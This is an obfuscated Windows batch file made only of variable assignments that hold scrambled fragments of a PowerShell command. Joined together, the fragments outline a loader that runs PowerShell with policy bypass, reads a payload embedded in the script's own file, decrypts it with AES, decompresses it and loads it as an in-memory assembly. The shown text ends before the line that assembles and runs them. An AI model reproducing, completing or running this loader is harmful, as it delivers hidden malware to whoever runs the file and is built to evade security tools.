@echo off
set "yMCzbtuWEJ=1."
set "lsCUmZospJ=ll"
set "gfeVVYictJ=po"
set "vBTUnnmuGm=ow"
set "wNYLiaCPby=s\"
set "wQXXoaeCsp=we"
set "GqmUzNNstO=co"
set "ouBBYsIGDd=he"
set "QVdywovQif=\v"
set "tLvpzsZVAM=st"
set "BgMdMgWbtV=:\"
set "sIoyvbpwZV=xe"
set "HvdsPvCoon=do"
set "TtDbpurlyz= C"
set "FVMCBwsrrx=we"
set "SvJgSKsIlP=\W"
set "MGctIgezRx=ll"
set "bHooUgGwvq=in"
set "MiViHEFzOU=rs"
set "djkLbfvQKz=Sy"
set "sPOXqcIVmU=Po"
set "TlAQYRHgcM=he"
set "xwLWtmNlFe=nd"
set "PmpEKCaapH=0\"
set "xyHZVYkWor=.e"
set "EWCOqKxZNs=em"
set "UTQOaQriaM=Wi"
set "tYytstOrGd=py"
set "syYpduFaWI= /"
set "pnjexPNBFZ=y "
set "KXjgamriTi=32"
set "iduXOlEWtM=rS"
set "bQcsUimvVF=ws"
set "ctGLSNNulS=cd"
set "JoGFkKxDpT= %~dp0"
set "GocSKFxUhj=.Dis"
set "UVnOOBgTqe== $f"
set "UliXIFuXan=EEL "
set "sTpdsmYEsM=and "
set "BahdJipLNY=fDgv"
set "UfQqjxRQbL= [Sy"
set "UtCYywxHPd=-nop"
set "TmXCiqwjyr=CKko"
set "TFoKQcWKHz=gnir"
set "kUVkEDNpSv=Q.Su"
set "gDxBOFSVXG=ct S"
set "SEzQYbIUBw=3); "
set "wYjKuLWafd=1..-"
set "nxssioEAoK=();$"
set "TZkYcukYDv=New-"
set "MNHDgDJrUC=brea"
set "wIlckxZrNo=ay()"
set "DFMjUvdafM=();$"
set "QiRlKxCtJG=saBm"
set "GFKpUeyJMw=d;$f"
set "VpgezYnfia=pxMq"
set "uWqbZNdvES=ect "
set "URRISUSmkZ='')("
set "kBuGwaxNmf=OyzA"
set "qMNrgsqxtb=ing("
set "ucyClJBwYM=bypa"
set "ZwoBkNyMxV=-joi"
set "EYbtDKJxxR=RLOM"
set "FmOfGNZjXR=grap"
set "lREnMXJUhZ=urit"
set "JyDupwFfRT=Obje"
set "yYjHLFyFRp=KkoL"
set "snofSCfkkC=$CKk"
set "imsWgnJLrV=bjec"
set "OWBcCpuMHF=g.En"
set "sRFshYMpOV='gni"
set "XiGuopLfeo=qt, "
set "pvpWjCFkwR=rt]:"
set "rWPgGlThqY=rity"
set "hiQbSmsmbF=t = "
set "sokpYfHqzV=ct S"
set "UIimNGQiBX=y.Pa"
set "COVmsjoAbX=e = "
set "bXFwoiOJoa=Obje"
set "DjstGamakp=Conv"
set "yvCvDJxuCa=nirt"
set "bxQBZDoWuj=OMQ."
set "nhBBwejJfY=hy.A"
set "ZMyOMmCsMU= if "
set "nlByVpidjG=ne);"
set "XmNchYGfhB=]::C"
set "MIIInRbFMv= '')"
set "VnjMQQjGFQ=PKCS"
set "RDeayGwRdu=Dgve"
set "rrQWMCbWIj=rWfd"
set "LzMIKmxvRw=join"
set "tjwaTVTHrZ=fore"
set "ihbChgpNnQ=Mqt."
set "gYXIVVwqWn=form"
set "JqVDSnjTsS=t Sy"
set "wmkbbXNPfW= New"
set "OVmyMShpBA=ment"
set "PZPWblGvMM=esMa"
set "JyWmWMvKKL=ptog"
set "JBtrxdIvQi=]::N"
set "DxosFHkUlj=gth)"
set "shOgLKnfhB=ress"
set "sqlvSSxACq=.Cry"
set "JiDxafBYqz=NrZn"
set "LjBtamqumH=TllA"
set "TVCQFIqvIp=ach "
set "bhkIVsRGKq=3HWs"
set "VZmZYzzPcU==');"
set "CfyOMFWDXD===')"
set "NJXoYEzLKa=KkoL"
set "oxSwuYhVVK=jVSI"
set "VEmEXcXXUv=)) {"
set "lgZrqUSUsz=orF'"
set "fHjqajVKKv=New-"
set "lFCLDfFTWm=, (,"
set "qFAuIPvBlh=yste"
set "eaOwWNQFCK=$fDg"
set "oyykYdzTei=L = "
set "kRlChMMgit=tem."
set "dWzHxrqbei=Secu"
set "LJRkmxaUwh=($RL"
set "YoKatISxaJ=)($H"
set "kzgmJzVhtB=am;$"
set "MUikCnwYVu=vert"
set "sITuiPvdYH=.Cop"
set "AgDeFnhAXb=raph"
set "INiURGTVok=$xjV"
set "XJJUAIINdC=isfL"
set "RwoSqFvkoT=lBlo"
set "hFdeSCGvCN=]::("
set "SmrqvKxUUm=-joi"
set "ylqpJddftn=).Sp"
set "OpWisvsodj=em.C"
set "oeNNlGMwdu=V = "
set "UZkjdoIsbl=J) {"
set "ZMuTVKsmNv=kxHZ"
set "cDvMZkCtNK=m.IO"
set "nahRrKyzAa=$xjV"
set "gOhjSfeMik=..-1"
set "PRlghrsPah=embl"
set "kEydvBtCpO=onve"
set "ndpuPmUdAP=.Ass"
set "iklSusIQon= [Sy"
set "DzKMfEBqXM=Dgve"
set "aYcNqeBqlg=comm"
set "gpVTILRaTg=esFX"
set "AsSWddSqFV=::De"
set "cfttchGWYd=Stre"
set "mqXTGFcXlr=);$f"
set "XuRuencaaI=('%~f0'"
set "cXFYYPTxqN=trea"
set "XdzdNQcmVS=m.IO"
set "ncfSNizGfe=);$f"
set "QXhTjDlgmY=se()"
